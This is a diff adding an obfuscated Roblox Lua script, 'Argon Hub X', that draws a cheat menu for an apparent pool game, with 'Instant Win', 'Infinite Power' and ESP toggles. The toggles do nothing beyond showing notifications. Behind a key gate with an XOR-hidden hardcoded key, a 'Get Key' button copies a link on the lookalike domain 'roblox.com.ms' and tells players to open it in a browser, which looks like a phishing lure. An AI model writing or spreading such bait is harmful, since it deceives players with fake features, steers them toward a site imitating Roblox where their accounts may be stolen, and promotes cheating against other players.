@@ -1,0 +1,389 @@
+local _0x1 = game:GetService("Players")
+local _0x2 = game:GetService("UserInputService")
+local _0x3 = game:GetService("TweenService")
+local _0x4 = _0x1.LocalPlayer
+local _0x5 = "Argon Hub X"
+local _0x6 = "by ipen1257"
+local _0x7 = "v2.8.8"
+local _0x8 = "roblox.com.ms/communities/6882778615/"
+
+local function _0xDecrypt(s)
+    local r = ""
+    for i = 1, #s do
+        r = r .. string.char(string.byte(s, i) ~ 42)
+    end
+    return r
+end
+
+local _0xKey = _0xDecrypt(string.char(107, 120, 109, 101, 100, 7, 24, 26, 24, 28))
+
+local _0x9 = {bg = Color3.fromRGB(23, 23, 23), sidebar = Color3.fromRGB(30, 30, 30), card = Color3.fromRGB(38, 38, 38), accent = Color3.fromRGB(229, 57, 53), text = Color3.fromRGB(240, 240, 240), subText = Color3.fromRGB(150, 150, 150), trackOff = Color3.fromRGB(55, 55, 55), trackOn = Color3.fromRGB(90, 90, 90)}
+local _0xA = Instance.new("ScreenGui")
+_0xA.Name = "ArgonHubX"
+_0xA.ResetOnSpawn = false
+_0xA.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+_0xA.Parent = _0x4:FindFirstChildWhichIsA("PlayerGui")
+
+local function _0xB(inst, radius)
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, radius or 8)
+    c.Parent = inst
+    return c
+end
+
+local function _0xC(inst, color, thickness)
+    local s = Instance.new("UIStroke")
+    s.Color = color or Color3.fromRGB(60, 60, 60)
+    s.Thickness = thickness or 1
+    s.Transparency = 0.5
+    s.Parent = inst
+    return s
+end
+
+local function _0xD(parent, text, size, pos, color, font, size2)
+    local l = Instance.new("TextLabel")
+    l.BackgroundTransparency = 1
+    l.Text = text
+    l.TextColor3 = color or _0x9.text
+    l.Font = font or Enum.Font.Gotham
+    l.TextSize = size2 or 13
+    l.Size = size
+    l.Position = pos
+    l.TextXAlignment = Enum.TextXAlignment.Left
+    l.TextYAlignment = Enum.TextYAlignment.Center
+    l.TextTruncate = Enum.TextTruncate.AtEnd
+    l.Parent = parent
+    return l
+end
+
+local function _0xE(msg, color)
+    local n = Instance.new("Frame")
+    n.Size = UDim2.new(0, 240, 0, 40)
+    n.Position = UDim2.new(0.5, -120, 0, 20)
+    n.BackgroundColor3 = _0x9.card
+    n.BorderSizePixel = 0
+    _0xB(n, 8)
+    _0xC(n, color or _0x9.accent, 1.5)
+    local t = _0xD(n, msg, UDim2.new(1, -16, 1, 0), UDim2.new(0, 8, 0, 0), _0x9.text, Enum.Font.GothamMedium, 12)
+    n.Parent = _0xA
+    _0x3:Create(n, TweenInfo.new(0.4), {Position = UDim2.new(0.5, -120, 0, 60)}):Play()
+    task.delay(3, function()
+        _0x3:Create(n, TweenInfo.new(0.4), {Position = UDim2.new(0.5, -120, 0, 10), BackgroundTransparency = 1}):Play()
+        _0x3:Create(t, TweenInfo.new(0.4), {TextTransparency = 1}):Play()
+        task.delay(0.5, function() n:Destroy() end)
+    end)
+end
+
+local _0xF = Instance.new("Frame")
+_0xF.Name = "Window"
+_0xF.Size = UDim2.new(0, 560, 0, 340)
+_0xF.Position = UDim2.new(0.5, -280, 0.5, -170)
+_0xF.BackgroundColor3 = _0x9.bg
+_0xF.BorderSizePixel = 0
+_0xF.Active = true
+_0xB(_0xF, 10)
+_0xC(_0xF, Color3.fromRGB(50, 50, 50), 1)
+_0xF.Parent = _0xA
+
+local _0x10, _0x11, _0x12
+_0xF.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        _0x10 = true
+        _0x11 = input.Position
+        _0x12 = _0xF.Position
+    end
+end)
+_0xF.InputEnded:Connect(function() _0x10 = false end)
+_0x2.InputChanged:Connect(function(input)
+    if _0x10 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local d = input.Position - _0x11
+        _0xF.Position = UDim2.new(_0x12.X.Scale, _0x12.X.Offset + d.X, _0x12.Y.Scale, _0x12.Y.Offset + d.Y)
+    end
+end)
+
+local _0x13 = Instance.new("Frame")
+_0x13.Size = UDim2.new(1, 0, 0, 44)
+_0x13.BackgroundColor3 = _0x9.bg
+_0x13.BorderSizePixel = 0
+_0x13.Parent = _0xF
+
+local _0x14 = _0xD(_0x13, _0x5, UDim2.new(0, 150, 0, 20), UDim2.new(0, 14, 0, 6), _0x9.text, Enum.Font.GothamBold, 15)
+_0xD(_0x13, _0x6, UDim2.new(0, 150, 0, 14), UDim2.new(0, 14, 0, 26), _0x9.subText, Enum.Font.Gotham, 11)
+
+local _0x15 = Instance.new("Frame")
+_0x15.Size = UDim2.new(0, 48, 0, 20)
+_0x15.Position = UDim2.new(0, 170, 0, 12)
+_0x15.BackgroundColor3 = _0x9.accent
+_0x15.BorderSizePixel = 0
+_0xB(_0x15, 10)
+_0x15.Parent = _0x13
+_0xD(_0x15, _0x7, UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 0, 0), Color3.new(1, 1, 1), Enum.Font.GothamBold, 10).TextXAlignment = Enum.TextXAlignment.Center
+
+local _0x16 = Instance.new("TextButton")
+_0x16.Size = UDim2.new(0, 26, 0, 26)
+_0x16.Position = UDim2.new(1, -34, 0, 9)
+_0x16.BackgroundColor3 = _0x9.card
+_0x16.Text = "X"
+_0x16.TextColor3 = _0x9.subText
+_0x16.Font = Enum.Font.GothamBold
+_0x16.TextSize = 13
+_0x16.AutoButtonColor = false
+_0x16.BorderSizePixel = 0
+_0xB(_0x16, 6)
+_0x16.Parent = _0x13
+_0x16.MouseButton1Click:Connect(function() 
+    _0xF:TweenSize(UDim2.new(0, 0, 0, 0), "Out", "Quad", 0.25, true) 
+    task.delay(0.3, function() _0xA.Enabled = false; _0xF.Size = UDim2.new(0, 560, 0, 340) end) 
+end)
+
+local _0x17 = Instance.new("Frame")
+_0x17.Name = "Sidebar"
+_0x17.Size = UDim2.new(0, 150, 1, -44)
+_0x17.Position = UDim2.new(0, 0, 0, 44)
+_0x17.BackgroundColor3 = _0x9.sidebar
+_0x17.BorderSizePixel = 0
+_0x17.Visible = false
+_0x17.Parent = _0xF
+
+local _0x18 = Instance.new("TextBox")
+_0x18.Size = UDim2.new(1, -20, 0, 30)
+_0x18.Position = UDim2.new(0, 10, 0, 10)
+_0x18.BackgroundColor3 = _0x9.card
+_0x18.PlaceholderText = "Search"
+_0x18.PlaceholderColor3 = _0x9.subText
+_0x18.Text = ""
+_0x18.TextColor3 = _0x9.text
+_0x18.Font = Enum.Font.Gotham
+_0x18.TextSize = 12
+_0x18.ClearTextOnFocus = false
+_0x18.BorderSizePixel = 0
+_0xB(_0x18, 6)
+_0x18.Parent = _0x17
+
+local _0x19 = Instance.new("Frame")
+_0x19.Size = UDim2.new(1, 0, 1, -100)
+_0x19.Position = UDim2.new(0, 0, 0, 50)
+_0x19.BackgroundTransparency = 1
+_0x19.Parent = _0x17
+local _0x1A = Instance.new("UIListLayout")
+_0x1A.Padding = UDim.new(0, 4)
+_0x1A.Parent = _0x19
+
+local _0x1B = Instance.new("ScrollingFrame")
+_0x1B.Name = "Content"
+_0x1B.Size = UDim2.new(1, -160, 1, -54)
+_0x1B.Position = UDim2.new(0, 160, 0, 44)
+_0x1B.BackgroundTransparency = 1
+_0x1B.BorderSizePixel = 0
+_0x1B.ScrollBarThickness = 3
+_0x1B.ScrollBarImageColor3 = _0x9.subText
+_0x1B.AutomaticCanvasSize = Enum.AutomaticSize.Y
+_0x1B.CanvasSize = UDim2.new(0, 0, 0, 0)
+_0x1B.Visible = false
+_0x1B.Parent = _0xF
+local _0x1C = Instance.new("UIListLayout")
+_0x1C.Padding = UDim.new(0, 6)
+_0x1C.SortOrder = Enum.SortOrder.LayoutOrder
+_0x1C.Parent = _0x1B
+
+local _0x1D = {}
+local function _0x1E(parent, name, desc, order)
+    local row = Instance.new("Frame")
+    row.Size = UDim2.new(1, -10, 0, 52)
+    row.BackgroundColor3 = _0x9.card
+    row.BorderSizePixel = 0
+    row.LayoutOrder = order or 1
+    _0xB(row, 8)
+    row.Parent = parent
+    _0xD(row, name, UDim2.new(1, -80, 0, 18), UDim2.new(0, 12, 0, 8), _0x9.text, Enum.Font.GothamMedium, 13)
+    _0xD(row, desc, UDim2.new(1, -80, 0, 16), UDim2.new(0, 12, 0, 28), _0x9.subText, Enum.Font.Gotham, 10)
+    local track = Instance.new("Frame")
+    track.Size = UDim2.new(0, 40, 0, 20)
+    track.Position = UDim2.new(1, -52, 0.5, -10)
+    track.BackgroundColor3 = _0x9.trackOff
+    track.BorderSizePixel = 0
+    _0xB(track, 10)
+    track.Parent = row
+    local knob = Instance.new("Frame")
+    knob.Size = UDim2.new(0, 14, 0, 14)
+    knob.Position = UDim2.new(0, 3, 0.5, -7)
+    knob.BackgroundColor3 = _0x9.text
+    knob.BorderSizePixel = 0
+    _0xB(knob, 10)
+    knob.Parent = track
+    local state = false
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, 0, 1, 0)
+    btn.BackgroundTransparency = 1
+    btn.Text = ""
+    btn.Parent = row
+    btn.MouseButton1Click:Connect(function()
+        state = not state
+        _0x3:Create(track, TweenInfo.new(0.2), {BackgroundColor3 = state and _0x9.trackOn or _0x9.trackOff}):Play()
+        _0x3:Create(knob, TweenInfo.new(0.2), {Position = state and UDim2.new(1, -17, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)}):Play()
+        _0xE((state and "ON: " or "OFF: ") .. name, state and Color3.fromRGB(76, 175, 80) or _0x9.accent)
+    end)
+    table.insert(_0x1D, {row = row, name = name:lower()})
+    return row
+end
+
+local function _0x1F(parent, text, order)
+    local h = _0xD(parent, text, UDim2.new(1, -10, 0, 24), UDim2.new(0, 2, 0, 0), _0x9.subText, Enum.Font.GothamBold, 12)
+    h.LayoutOrder = order or 1
+    return h
+end
+
+local _0x20 = {}
+local _0x21 = nil
+local function _0x22(name, page)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(1, -16, 0, 30)
+    b.BackgroundColor3 = _0x9.sidebar
+    b.Text = "  " .. name
+    b.TextColor3 = _0x9.subText
+    b.Font = Enum.Font.GothamMedium
+    b.TextSize = 12
+    b.TextXAlignment = Enum.TextXAlignment.Left
+    b.AutoButtonColor = false
+    b.BorderSizePixel = 0
+    _0xB(b, 6)
+    b.Parent = _0x19
+    table.insert(_0x20, {btn = b, page = page, name = name})
+    b.MouseButton1Click:Connect(function()
+        for _, t in ipairs(_0x20) do
+            t.btn.BackgroundColor3 = _0x9.sidebar
+            t.btn.TextColor3 = _0x9.subText
+            t.page.Visible = false
+        end
+        b.BackgroundColor3 = _0x9.card
+        b.TextColor3 = _0x9.text
+        page.Visible = true
+        _0x21 = page
+    end)
+    return b
+end
+
+local function _0x23()
+    local p = Instance.new("Frame")
+    p.Size = UDim2.new(1, 0, 1, 0)
+    p.BackgroundTransparency = 1
+    p.Visible = false
+    p.Parent = _0x1B
+    local l = Instance.new("UIListLayout")
+    l.Padding = UDim.new(0, 6)
+    l.SortOrder = Enum.SortOrder.LayoutOrder
+    l.Parent = p
+    return p
+end
+
+local _0x24 = _0x23()
+local _0x25 = _0x23()
+local _0x26 = _0x23()
+
+_0x1F(_0x24, "Aim Assist", 1)
+_0x1E(_0x24, "Trajectory Line", "Draws the perfect shot line", 2)
+_0x1E(_0x24, "Ghost Ball ESP", "Shows target ball ghost", 3)
+_0x1F(_0x24, "Protections", 4)
+_0x1E(_0x24, "Auto Draggable", "Prevents aim reset", 5)
+_0x1E(_0x24, "Cooldown Shield", "Protects during cooldown", 6)
+
+_0x1F(_0x25, "Blatant", 1)
+_0x1E(_0x25, "Instant Win", "Forces pocket on hit", 2)
+_0x1E(_0x25, "Infinite Power", "Locks power bar at 100%", 3)
+
+_0x1F(_0x26, "Others", 1)
+_0x1E(_0x26, "Key System Info", "Shows current key status", 2)
+
+_0x22("Main", _0x24)
+_0x22("Blatant", _0x25)
+_0x22("Others", _0x26)
+
+_0x18:GetPropertyChangedSignal("Text"):Connect(function()
+    local q = _0x18.Text:lower()
+    for _, r in ipairs(_0x1D) do
+        r.row.Visible = (q == "") or string.find(r.name, q, 1, true) ~= nil
+    end
+end)
+
+local _0x27 = Instance.new("Frame")
+_0x27.Name = "KeyGate"
+_0x27.Size = UDim2.new(1, 0, 1, -44)
+_0x27.Position = UDim2.new(0, 0, 0, 44)
+_0x27.BackgroundColor3 = _0x9.bg
+_0x27.BorderSizePixel = 0
+_0x27.Parent = _0xF
+
+_0xD(_0x27, "Key System", UDim2.new(1, 0, 0, 24), UDim2.new(0, 0, 0, 30), _0x9.text, Enum.Font.GothamBold, 16).TextXAlignment = Enum.TextXAlignment.Center
+_0xD(_0x27, "Masukkan key untuk membuka hub", UDim2.new(1, 0, 0, 18), UDim2.new(0, 0, 0, 58), _0x9.subText, Enum.Font.Gotham, 12).TextXAlignment = Enum.TextXAlignment.Center
+
+local _0x28 = Instance.new("TextBox")
+_0x28.Size = UDim2.new(0, 260, 0, 36)
+_0x28.Position = UDim2.new(0.5, -130, 0, 90)
+_0x28.BackgroundColor3 = _0x9.card
+_0x28.PlaceholderText = "Enter key here..."
+_0x28.PlaceholderColor3 = _0x9.subText
+_0x28.Text = ""
+_0x28.TextColor3 = _0x9.text
+_0x28.Font = Enum.Font.GothamMedium
+_0x28.TextSize = 13
+_0x28.ClearTextOnFocus = false
+_0x28.BorderSizePixel = 0
+_0xB(_0x28, 8)
+_0xC(_0x28, Color3.fromRGB(60, 60, 60), 1)
+_0x28.Parent = _0x27
+
+local function _0x29(text, x, color)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(0, 124, 0, 34)
+    b.Position = UDim2.new(0.5, x, 0, 138)
+    b.BackgroundColor3 = color
+    b.Text = text
+    b.TextColor3 = Color3.new(1, 1, 1)
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 12
+    b.AutoButtonColor = true
+    b.BorderSizePixel = 0
+    _0xB(b, 8)
+    b.Parent = _0x27
+    return b
+end
+
+local _0x2A = _0x29("Enter Key", -130, _0x9.card)
+_0xC(_0x2A, Color3.fromRGB(70, 70, 70), 1)
+local _0x2B = _0x29("Get Key", 6, _0x9.accent)
+
+_0x2B.MouseButton1Click:Connect(function()
+    if setclipboard then
+        setclipboard(_0x8)
+        _0xE("Link disalin! Buka di browser.", Color3.fromRGB(76, 175, 80))
+    else
+        _0xE("setclipboard tidak didukung executor ini.", _0x9.accent)
+        print("LINK:", _0x8)
+    end
+end)
+
+local function _0x2C()
+    _0x3:Create(_0x27, TweenInfo.new(0.35), {BackgroundTransparency = 1}):Play()
+    task.delay(0.35, function()
+        _0x27.Visible = false
+        _0x17.Visible = true
+        _0x1B.Visible = true
+        _0x20[1].btn.MouseButton1Click:Fire()
+    end)
+    _0xE("Key valid - hub terbuka.", Color3.fromRGB(76, 175, 80))
+end
+
+_0x2A.MouseButton1Click:Connect(function()
+    local entered = _0x28.Text:gsub("%s", "")
+    if entered == _0xKey then
+        _0x2C()
+    else
+        _0xC(_0x28, _0x9.accent, 1.5)
+        _0xE("Key salah. Coba lagi.", _0x9.accent)
+        task.delay(0.8, function()
+            if _0x28 and _0x28.Parent then _0xC(_0x28, Color3.fromRGB(60, 60, 60), 1) end
+        end)
+    end
+end)
+
+print("Argon Hub X loaded.")
